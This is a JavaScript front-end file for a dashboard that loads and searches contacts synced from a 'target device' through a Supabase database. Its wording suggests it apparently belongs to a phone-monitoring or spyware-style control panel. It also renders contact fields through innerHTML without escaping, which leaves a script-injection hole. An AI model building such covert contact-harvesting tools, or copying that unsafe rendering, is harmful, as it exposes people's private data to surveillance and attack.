document.addEventListener('DOMContentLoaded', async () => {
    const container = document.getElementById('contacts-container');
    const searchInput = document.getElementById('search-input');
    const deviceId = localStorage.getItem('active_device_id');
    let allContacts = [];

    if (!deviceId) {
        container.innerHTML = '<p style="color: #d32f2f;">Critical Error: Target Device ID missing. Please select a device from the dashboard.</p>';
        return;
    }

    try {
        // 1. Get Supabase Config
        const configRes = await fetch('/api/config');
        const config = await configRes.json();
        
        // 2. Fetch live data from Supabase REST API (Order by name)
        const contactsRes = await fetch(`${config.supabase_url}/rest/v1/contacts?device_id=eq.${deviceId}&order=name.asc`, {
            headers: {
                'apikey': config.supabase_key,
                'Authorization': `Bearer ${config.supabase_key}`
            }
        });

        const data = await contactsRes.json();

        if (!data || data.length === 0) {
            container.innerHTML = '<p style="color: #aaa;">No contacts synchronized yet. Waiting for device payload...</p>';
            return;
        }

        allContacts = data;
        renderContacts(allContacts);

    } catch (error) {
        console.error("Contacts Fetch Failure:", error);
        container.innerHTML = '<p style="color: #d32f2f;">Database connection failed. Check network logs.</p>';
    }

    // 3. Real-time Search Filter Engine
    searchInput.addEventListener('input', (e) => {
        const query = e.target.value.toLowerCase();
        const filtered = allContacts.filter(c => 
            (c.name && c.name.toLowerCase().includes(query)) || 
            (c.phone_number && c.phone_number.includes(query))
        );
        renderContacts(filtered);
    });

    function renderContacts(contactList) {
        container.innerHTML = '';
        if (contactList.length === 0) {
            container.innerHTML = '<p style="color: #888;">No matches found.</p>';
            return;
        }

        contactList.forEach(contact => {
            const card = document.createElement('div');
            card.className = 'contact-card';
            card.innerHTML = `
                <div class="contact-info">
                    <span class="contact-name">${contact.name || 'Unknown'}</span>
                    <span class="contact-number">${contact.phone_number}</span>
                </div>
                <a href="tel:${contact.phone_number}" class="action-btn">Call from Admin</a>
            `;
            container.appendChild(card);
        });
    }
});
